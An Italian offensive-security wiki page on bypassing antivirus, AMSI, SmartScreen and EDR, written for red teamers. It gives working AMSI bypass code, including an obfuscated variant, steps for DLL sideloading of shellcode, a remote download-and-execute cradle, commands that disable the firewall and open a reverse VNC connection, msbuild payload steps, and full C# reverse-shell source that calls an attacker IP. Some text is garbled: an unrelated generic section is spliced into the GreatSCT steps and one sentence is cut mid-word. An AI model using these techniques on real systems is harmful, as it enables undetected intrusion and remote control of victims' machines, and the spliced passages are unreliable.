# Bypass dell'antivirus (AV)

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT**](https://opensea.io/collection/the-peass-family) esclusivi
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) **e** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **repository di GitHub.**

</details>

**Questa pagina è stata scritta da** [**@m2rc\_p**](https://twitter.com/m2rc\_p)**!**

## **Metodologia di elusione dell'AV**

Attualmente, gli AV utilizzano diversi metodi per verificare se un file è maligno o meno, come la rilevazione statica, l'analisi dinamica e, per gli EDR più avanzati, l'analisi comportamentale.

### **Rilevazione statica**

La rilevazione statica viene effettuata individuando stringhe o array di byte maligni noti in un file binario o script, estraendo informazioni dal file stesso (ad esempio, descrizione del file, nome dell'azienda, firme digitali, icona, checksum, ecc.). Ciò significa che l'utilizzo di strumenti pubblici noti può farti scoprire più facilmente, poiché probabilmente sono stati analizzati e segnalati come maligni. Ci sono un paio di modi per aggirare questo tipo di rilevazione:

* **Crittografia**

Se crittografi il binario, l'AV non sarà in grado di rilevare il tuo programma, ma avrai bisogno di un qualche tipo di caricatore per decrittare ed eseguire il programma in memoria.

* **Oscuramento**

A volte tutto ciò che devi fare è modificare alcune stringhe nel tuo binario o script per farlo passare attraverso l'AV, ma ciò può richiedere molto tempo a seconda di ciò che stai cercando di oscurare.

* **Strumenti personalizzati**

Se sviluppi i tuoi strumenti, non ci saranno firme maligne note, ma ciò richiede molto tempo e impegno.

{% hint style="info" %}
Un buon modo per verificare la rilevazione statica di Windows Defender è [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Suddivide il file in più segmenti e quindi chiede a Defender di analizzare ciascuno separatamente, in questo modo può dirti esattamente quali stringhe o byte sono stati segnalati nel tuo binario.
{% endhint %}

Consiglio vivamente di dare un'occhiata a questa [playlist di YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk\_pkb12mDe4PgYZ5qPxhGKGf) sull'elusione pratica dell'AV.

### **Analisi dinamica**

L'analisi dinamica avviene quando l'AV esegue il tuo binario in una sandbox e osserva l'attività maligna (ad esempio, tentativi di decrittare e leggere le password del browser, esecuzione di un minidump su LSASS, ecc.). Questa parte può essere un po' più complicata da gestire, ma ecco alcune cose che puoi fare per eludere le sandbox.

* **Attendi prima dell'esecuzione** A seconda di come è implementato, può essere un ottimo modo per eludere l'analisi dinamica dell'AV. Gli AV hanno poco tempo per analizzare i file per non interrompere il flusso di lavoro dell'utente, quindi l'utilizzo di attese lunghe può disturbare l'analisi dei binari. Il problema è che molte sandbox degli AV possono semplicemente saltare l'attesa a seconda di come è implementata.

* **Verifica delle risorse della macchina** Di solito le sandbox hanno poche risorse a disposizione (ad esempio, < 2 GB di RAM), altrimenti potrebbero rallentare la macchina dell'utente. Puoi essere molto creativo anche qui, ad esempio verificando la temperatura della CPU o addirittura la velocità delle ventole, non tutto sarà implementato nella sandbox.

* **Verifiche specifiche della macchina** Se vuoi prendere di mira un utente il cui computer è collegato al dominio "contoso.local", puoi verificare il dominio del computer per vedere se corrisponde a quello specificato, se non corrisponde, puoi far uscire il tuo programma.

Si scopre che il nome del computer della sandbox di Microsoft Defender è HAL9TH, quindi puoi verificare il nome del computer nel tuo malware prima della detonazione, se il nome corrisponde a HAL9TH, significa che sei all'interno della sandbox di Defender, quindi puoi far uscire il tuo programma.

<figure><img src="../.gitbook/assets/image (3) (6).png" alt=""><figcaption><p>fonte: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Alcuni altri ottimi consigli da [@mgeeky](https://twitter.com/mariuszbit) per contrastare le sandbox

<figure><img src="../.gitbook/assets/image (2) (1) (1) (2) (1).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Come abbiamo detto in precedenza in questo post, gli **strumenti pubblici** verranno alla fine **rilevati**, quindi dovresti chiederti qualcosa:

Ad esempio, se vuoi estrarre LSASS, **hai davvero bisogno di usare mimikatz**? O potresti utilizzare un progetto diverso meno conosciuto che estrae anche LSASS.

La risposta corretta è probabilmente la seconda. Prendendo mimikatz come esempio, è probabilmente uno dei malware più segnalati dagli AV e dagli EDR, anche se il progetto stesso è molto interessante, è anche un incubo lavorare con esso per eludere gli AV, quindi cerca alternative per ciò che stai cercando di ottenere.

{% hint style="info" %}
Quando modifichi i tuoi payload per l'elusione, assicurati di **disattivare l'invio automatico dei campioni** in Defender e, per favore, seriamente, **NON CARICARE SU VIRUSTOTAL** se il tuo obiettivo è ottenere l'elusione a lungo termine. Se vuoi verificare se il tuo payload viene rilevato da un particolare AV, installalo su una VM, cerca di disattivare l'invio automatico dei campioni e testalo lì fino a quando non sei soddisfatto del risultato.
{% endhint %}

## EXE vs DLL

Quando è possibile, **dai sempre la priorità all'utilizzo di DLL per l'elusione**, nella mia esperienza, i file DLL sono di solito **molto meno rilevati** e analizzati, quindi è un trucco molto semplice da usare per evitare la rilevazione in alcuni casi (se il tuo payload ha un modo di eseguirsi come DLL, ovviamente).

Come possiamo vedere in questa immagine, un payload DLL di Havoc ha un tasso di rilevamento di 4/26 in antiscan.me, mentre il payload EXE ha un tasso di rilevamento di 7/26.

<figure><img src="../.gitbook/assets/image (6) (3) (1).png" alt=""><figcaption><p>confronto di antiscan.me tra un normale payload EXE di Havoc e un normale payload DLL di Havoc</p></figcaption></figure>

Ora mostreremo alcuni trucchi che puoi utilizzare con i file DLL per essere molto più stealthier.
## DLL Sideloading & Proxying

**DLL Sideloading** sfrutta l'ordine di ricerca delle DLL utilizzato dal loader posizionando sia l'applicazione vittima che i payload maligni uno accanto all'altro.

Puoi verificare i programmi suscettibili a DLL Sideloading utilizzando [Siofra](https://github.com/Cybereason/siofra) e lo script powershell seguente:

{% code overflow="wrap" %}
```powershell
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Questo comando restituirà l'elenco dei programmi suscettibili di DLL hijacking all'interno di "C:\Program Files\\" e i file DLL che cercano di caricare.

Ti consiglio vivamente di **esplorare i programmi DLL Hijackable/Sideloadable da solo**, questa tecnica è abbastanza stealth se fatta correttamente, ma se utilizzi programmi DLL Sideloadable noti pubblicamente, potresti essere facilmente scoperto.

Semplicemente posizionando una DLL malevola con il nome che un programma si aspetta di caricare, non caricherà il tuo payload, poiché il programma si aspetta alcune funzioni specifiche all'interno di quella DLL. Per risolvere questo problema, utilizzeremo un'altra tecnica chiamata **DLL Proxying/Forwarding**.

**DLL Proxying** inoltra le chiamate che un programma effettua dalla DLL proxy (e malevola) alla DLL originale, preservando così la funzionalità del programma e consentendo l'esecuzione del tuo payload.

Utilizzerò il progetto [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) di [@flangvik](https://twitter.com/Flangvik/)

Questi sono i passaggi che ho seguito:

{% code overflow="wrap" %}
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
{% endcode %}

L'ultimo comando ci darà 2 file: un modello di codice sorgente DLL e la DLL originale rinominata.

<figure><img src="../.gitbook/assets/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
{% endcode %}

Questi sono i risultati:

<figure><img src="../.gitbook/assets/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Sia il nostro shellcode (codificato con [SGN](https://github.com/EgeBalci/sgn)) che la DLL proxy hanno un tasso di rilevamento di 0/26 in [antiscan.me](https://antiscan.me)! Direi che è un successo.

<figure><img src="../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
**Consiglio vivamente** di guardare il video di [S3cur3Th1sSh1t su Twitch](https://www.twitch.tv/videos/1644171543) su DLL Sideloading e anche il video di [ippsec](https://www.youtube.com/watch?v=3eROsG\_WNpE) per approfondire ulteriormente ciò di cui abbiamo discusso.
{% endhint %}

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze è un toolkit di payload per bypassare gli EDR utilizzando processi sospesi, chiamate di sistema dirette e metodi di esecuzione alternativi`

Puoi utilizzare Freeze per caricare ed eseguire il tuo shellcode in modo stealthy.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../.gitbook/assets/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
L'evasione è solo un gioco del gatto e del topo, ciò che funziona oggi potrebbe essere rilevato domani, quindi non fare affidamento su un solo strumento, se possibile, prova a concatenare più tecniche di elusione.
{% endhint %}

## AMSI (Interfaccia di scansione anti-malware)

AMSI è stato creato per prevenire il "[malware senza file](https://en.wikipedia.org/wiki/Fileless\_malware)". Inizialmente, gli AV erano in grado di scansionare solo **file su disco**, quindi se riuscivi in qualche modo ad eseguire payload **direttamente in memoria**, l'AV non poteva fare nulla per prevenirlo, poiché non aveva sufficiente visibilità.

La funzionalità AMSI è integrata in questi componenti di Windows.

* Controllo dell'account utente, o UAC (elevazione di EXE, COM, MSI o installazione di ActiveX)
* PowerShell (script, uso interattivo e valutazione del codice dinamico)
* Windows Script Host (wscript.exe e cscript.exe)
* JavaScript e VBScript
* Macro di Office VBA

Consente alle soluzioni antivirus di ispezionare il comportamento degli script esponendo il contenuto degli script in una forma sia non crittografata che non oscurata.

L'esecuzione di `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` produrrà l'avviso seguente in Windows Defender.

<figure><img src="../.gitbook/assets/image (4) (5).png" alt=""><figcaption></figcaption></figure>

Nota come aggiunge inizialmente `amsi:` e quindi il percorso dell'eseguibile da cui lo script è stato eseguito, in questo caso powershell.exe

Non abbiamo lasciato alcun file su disco, ma siamo stati comunque catturati in memoria a causa di AMSI.

Ci sono un paio di modi per aggirare AMSI:

* **Oscuramento**

Poiché AMSI funziona principalmente con rilevazioni statiche, modificare gli script che si tenta di caricare può essere un buon modo per eludere la rilevazione.

Tuttavia, AMSI ha la capacità di deoscurare gli script anche se ha più livelli, quindi l'oscuramento potrebbe essere una cattiva opzione a seconda di come viene fatto. Ciò rende l'elusione non così diretta. Tuttavia, a volte, tutto ciò che devi fare è cambiare un paio di nomi di variabili e sarai a posto, quindi dipende da quanto qualcosa è stato segnalato.

* **Bypass di AMSI**

Poiché AMSI viene implementato caricando una DLL nel processo powershell (anche cscript.exe, wscript.exe, ecc.), è possibile manometterlo facilmente anche se si esegue come utente non privilegiato. A causa di questa falla nell'implementazione di AMSI, i ricercatori hanno trovato più modi per eludere la scansione AMSI.

**Forzare un errore**

Forzare il fallimento dell'inizializzazione di AMSI (amsiInitFailed) farà sì che nessuna scansione venga avviata per il processo corrente. Originariamente ciò è stato divulgato da [Matt Graeber](https://twitter.com/mattifestation) e Microsoft ha sviluppato una firma per prevenire un uso più ampio.

{% code overflow="wrap" %}
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
{% endcode %}

Tutto ciò che è stato necessario è una sola riga di codice powershell per rendere AMSI inutilizzabile per il processo powershell corrente. Naturalmente, questa riga è stata segnalata da AMSI stesso, quindi è necessaria una modifica per utilizzare questa tecnica.

Ecco un bypass AMSI modificato che ho preso da questo [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```powershell
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
**Memory Patching**

Questa tecnica è stata inizialmente scoperta da [@RastaMouse](https://twitter.com/\_RastaMouse/) e consiste nel trovare l'indirizzo della funzione "AmsiScanBuffer" in amsi.dll (responsabile della scansione dell'input fornito dall'utente) e sovrascriverlo con istruzioni per restituire il codice per E\_INVALIDARG, in questo modo il risultato della scansione effettiva restituirà 0, che viene interpretato come un risultato pulito.

{% hint style="info" %}
Si prega di leggere [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) per una spiegazione più dettagliata.
{% endhint %}

Ci sono anche molte altre tecniche utilizzate per bypassare AMSI con powershell, controlla [**questa pagina**](basic-powershell-for-pentesters/#amsi-bypass) e [questo repository](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) per saperne di più su di esse.

O questo script che tramite memory patching patcherà ogni nuovo Powersh

## Obfuscation

Ci sono diversi strumenti che possono essere utilizzati per **oscurare il codice C# in chiaro**, generare **modelli di metaprogrammazione** per compilare binari o **oscurare i binari compilati** come:

* [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: oscuratore C#**
* [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Lo scopo di questo progetto è fornire un fork open-source della suite di compilazione [LLVM](http://www.llvm.org/) in grado di fornire una maggiore sicurezza del software attraverso l'oscuramento del codice e la protezione da manomissioni.
* [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator dimostra come utilizzare il linguaggio `C++11/14` per generare, durante la compilazione, codice oscurato senza utilizzare alcun strumento esterno e senza modificare il compilatore.
* [**obfy**](https://github.com/fritzone/obfy): Aggiunge un livello di operazioni oscurate generate dal framework di metaprogrammazione dei modelli C++ che renderà un po' più difficile la vita della persona che vuole craccare l'applicazione.
* [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz è un oscuratore binario x64 in grado di oscurare diversi file pe, inclusi: .exe, .dll, .sys
* [**metame**](https://github.com/a0rtega/metame): Metame è un semplice motore di codice metamorfico per eseguibili arbitrari.
* [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator è un framework di oscuramento del codice a grana fine per i linguaggi supportati da LLVM che utilizza ROP (return-oriented programming). ROPfuscator oscura un programma a livello di codice assembly trasformando le istruzioni regolari in catene ROP, contrastando la nostra concezione naturale del flusso di controllo normale.
* [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt è un criptatore .NET PE scritto in Nim
* [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor è in grado di convertire EXE/DLL esistenti in shellcode e quindi caricarli

## SmartScreen & MoTW

Potresti aver visto questa schermata quando scarichi alcuni eseguibili da Internet ed eseguili.

Microsoft Defender SmartScreen è un meccanismo di sicurezza destinato a proteggere l'utente finale dall'esecuzione di applicazioni potenzialmente dannose.

<figure><img src="../.gitbook/assets/image (1) (4).png" alt=""><figcaption></figcaption></figure>

SmartScreen funziona principalmente con un approccio basato sulla reputazione, il che significa che le applicazioni scaricate in modo insolito attiveranno SmartScreen, avvertendo e impedendo all'utente finale di eseguire il file (anche se il file può comunque essere eseguito facendo clic su Altre informazioni -> Esegui comunque).

**MoTW** (Mark of The Web) è un [NTFS Alternate Data Stream](https://en.wikipedia.org/wiki/NTFS#Alternate\_data\_stream\_\(ADS\)) con il nome di Zone.Identifier che viene creato automaticamente durante il download dei file da Internet, insieme all'URL da cui è stato scaricato.

<figure><img src="../.gitbook/assets/image (13) (3).png" alt=""><figcaption><p>Verifica dell'ADS Zone.Identifier per un file scaricato da Internet.</p></figcaption></figure>

{% hint style="info" %}
È importante notare che gli eseguibili firmati con un certificato di firma **affidabile** non attiveranno SmartScreen.
{% endhint %}

Un modo molto efficace per evitare che i tuoi payload ottengano il Mark of The Web è impacchettarli all'interno di un qualche tipo di contenitore come un ISO. Questo accade perché Mark-of-the-Web (MOTW) **non può** essere applicato a volumi **non NTFS**.

<figure><img src="../.gitbook/assets/image (12) (2) (2).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) è uno strumento che impacchetta i payload in contenitori di output per eludere il Mark-of-the-Web.

Esempio di utilizzo:
```powershell
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Ecco una demo per bypassare SmartScreen confezionando payload all'interno di file ISO utilizzando [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../.gitbook/assets/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## Reflection dell'assembly C#

Il caricamento di binari C# in memoria è noto da molto tempo ed è ancora un ottimo modo per eseguire strumenti di post-exploitation senza essere rilevati dall'AV.

Poiché il payload verrà caricato direttamente in memoria senza toccare il disco, dovremo solo preoccuparci di patchare AMSI per l'intero processo.

La maggior parte dei framework C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, ecc.) fornisce già la possibilità di eseguire assembly C# direttamente in memoria, ma ci sono diversi modi per farlo:

* **Fork\&Run**

Coinvolge **creare un nuovo processo sacrificale**, iniettare il codice malevolo di post-exploitation in quel nuovo processo, eseguire il codice malevolo e, quando finito, terminare il nuovo processo. Questo metodo ha sia vantaggi che svantaggi. Il vantaggio del metodo fork and run è che l'esecuzione avviene **al di fuori** del nostro processo di impianto Beacon. Ciò significa che se qualcosa nel nostro azione di post-exploitation va storto o viene rilevato, c'è una **molto maggiore possibilità** che il nostro **impianto sopravviva**. Lo svantaggio è che hai una **maggiore possibilità** di essere rilevato dalle **detection comportamentali**.

<figure><img src="../.gitbook/assets/image (7) (1) (3).png" alt=""><figcaption></figcaption></figure>

* **Inline**

Si tratta di iniettare il codice malevolo di post-exploitation **nel proprio processo**. In questo modo, è possibile evitare di dover creare un nuovo processo e farlo scansionare dall'AV, ma lo svantaggio è che se qualcosa va storto con l'esecuzione del payload, c'è una **molto maggiore possibilità** di **perdere il beacon** in quanto potrebbe bloccarsi.

<figure><img src="../.gitbook/assets/image (9) (3) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Se vuoi leggere di più sul caricamento dell'assembly C#, consulta questo articolo [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) e il loro BOF InlineExecute-Assembly ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))
{% endhint %}

Puoi anche caricare assembly C# **da PowerShell**, dai un'occhiata a [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) e al video di [S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Utilizzo di altri linguaggi di programmazione

Come proposto in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), è possibile eseguire codice malevolo utilizzando altri linguaggi fornendo alla macchina compromessa l'accesso **all'ambiente dell'interprete installato sulla condivisione SMB controllata dall'attaccante**.&#x20;

Consentendo l'accesso ai binari dell'interprete e all'ambiente sulla condivisione SMB, è possibile **eseguire codice arbitrario in questi linguaggi all'interno della memoria** della macchina compromessa.

Il repository indica: Defender scansiona ancora gli script, ma utilizzando Go, Java, PHP, ecc. abbiamo **maggiore flessibilità per eludere le firme statiche**. I test con script di shell inversa casuali non oscurati in questi linguaggi hanno avuto successo.

## Evasione avanzata

L'evasione è un argomento molto complicato, a volte devi tenere conto di molte diverse fonti di telemetria in un solo sistema, quindi è praticamente impossibile rimanere completamente indetecttati in ambienti maturi.

Ogni ambiente contro cui vai avrà i suoi punti di forza e di debolezza.

Ti consiglio vivamente di guardare questa presentazione di [@ATTL4S](https://twitter.com/DaniLJ94), per avere una panoramica delle tecniche di evasione avanzate.

{% embed url="https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo" %}

Questa è anche un'altra ottima presentazione di [@mariuszbit](https://twitter.com/mariuszbit) sull'evasione in profondità.

{% embed url="https://www.youtube.com/watch?v=IbA7Ung39o4" %}

## **Vecchie tecniche**

### **Verifica quali parti Defender rileva come malevole**

Puoi utilizzare [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) che **rimuoverà parti del binario** fino a quando **scoprirà quale parte Defender** sta rilevando come malevola e te la dividerà.\
Un altro strumento che fa **la stessa cosa è** [**avred**](https://github.com/dobin/avred) con un'offerta web aperta del servizio in [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Server Telnet**

Fino a Windows10, tutti i Windows erano dotati di un **server Telnet** che potevi installare (come amministratore) eseguendo:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Fai in modo che **inizi** quando il sistema viene avviato e **eseguilo** ora:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Cambiare la porta di telnet** (stealth) e disabilitare il firewall:

Per aumentare la furtività e rendere più difficile la rilevazione delle attività di telnet, è possibile cambiare la porta predefinita utilizzata da telnet. Questo può essere fatto modificando la configurazione del servizio di telnet nel sistema operativo.

Inoltre, per disabilitare il firewall, è possibile seguire i seguenti passaggi:

1. Accedere al pannello di controllo del sistema operativo.
2. Selezionare "Sicurezza" o "Firewall di Windows".
3. Fare clic su "Impostazioni avanzate" o "Configura il firewall".
4. Selezionare "Disabilita il firewall" o "Spegni il firewall".
5. Salvare le modifiche e riavviare il sistema operativo per applicare le nuove impostazioni.

È importante notare che disabilitare il firewall può esporre il sistema a potenziali minacce di sicurezza. Pertanto, è consigliabile prendere precauzioni aggiuntive per proteggere il sistema, come l'utilizzo di un firewall di terze parti o l'implementazione di altre misure di sicurezza.
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Scaricalo da: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (vuoi il download binario, non l'installazione)

**SUL SERVER**: Esegui _**winvnc.exe**_ e configura il server:

* Abilita l'opzione _Disabilita TrayIcon_
* Imposta una password in _VNC Password_
* Imposta una password in _View-Only Password_

Successivamente, sposta il file binario _**winvnc.exe**_ e il file **appena creato** _**UltraVNC.ini**_ all'interno della **vittima**

#### **Connessione inversa**

L'**attaccante** dovrebbe **eseguire all'interno** del suo **server** il binario `vncviewer.exe -listen 5900` in modo da essere **pronto** per ricevere una connessione **VNC inversa**. Quindi, all'interno della **vittima**: Avvia il demone winvnc `winvnc.exe -run` e esegui `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ATTENZIONE:** Per mantenere la furtività, non devi fare alcune cose

* Non avviare `winvnc` se è già in esecuzione o attiverai un [popup](https://i.imgur.com/1SROTTl.png). Verifica se è in esecuzione con `tasklist | findstr winvnc`
* Non avviare `winvnc` senza `UltraVNC.ini` nella stessa directory o verrà aperta [la finestra di configurazione](https://i.imgur.com/rfMQWcf.png)
* Non eseguire `winvnc -h` per ottenere aiuto o attiverai un [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Scaricalo da: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
All'interno di GreatSCT:

## AV Bypass

### Introduzione

Quando si esegue un attacco di penetration testing, è fondamentale riuscire a bypassare i sistemi di rilevamento degli antivirus (AV) per poter eseguire il codice malevolo senza essere rilevati. Gli AV sono progettati per rilevare e bloccare software dannoso, quindi è importante conoscere le tecniche per eludere la loro rilevazione.

### Tecniche di bypass AV

Di seguito sono riportate alcune delle tecniche più comuni per bypassare gli AV:

#### Polimorfismo

Il polimorfismo è una tecnica che consente di modificare il codice malevolo in modo che ogni esecuzione generi una versione diversa del malware. In questo modo, il malware risulta difficile da rilevare per gli AV che si basano su firme o pattern specifici.

#### Criptazione

La criptazione del codice malevolo può aiutare a nascondere la sua natura dannosa. Utilizzando algoritmi di criptazione, è possibile rendere il codice illeggibile per gli AV, che non saranno in grado di riconoscere la sua natura malevola.

#### Metamorfismo

Il metamorfismo è una tecnica avanzata che consente di modificare il codice malevolo in modo che la sua struttura e il suo comportamento cambino ad ogni esecuzione. Questo rende il malware estremamente difficile da rilevare per gli AV.

#### Falsi positivi

I falsi positivi sono file o codice che vengono creati appositamente per ingannare gli AV. Questi file sembrano essere dannosi, ma in realtà non lo sono. L'obiettivo è far sì che gli AV rilevino e bloccino questi falsi positivi, in modo che il vero malware possa passare inosservato.

### Conclusioni

Bypassare gli AV è una parte essenziale dell'attività di penetration testing. Conoscere le tecniche di bypass e saperle applicare correttamente può consentire di eseguire con successo attacchi senza essere rilevati. Tuttavia, è importante ricordare che l'utilizzo di queste tecniche per scopi illegali è un reato e può comportare conseguenze legali.
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Ora **avvia il lister** con `msfconsole -r file.rc` ed **esegui** il **payload xml** con:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Il difensore attuale terminerà il processo molto velocemente.**

### Compilare il nostro proprio reverse shell

https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Primo C# Revershell

Compilarlo con:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Usalo con:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# utilizzando il compilatore

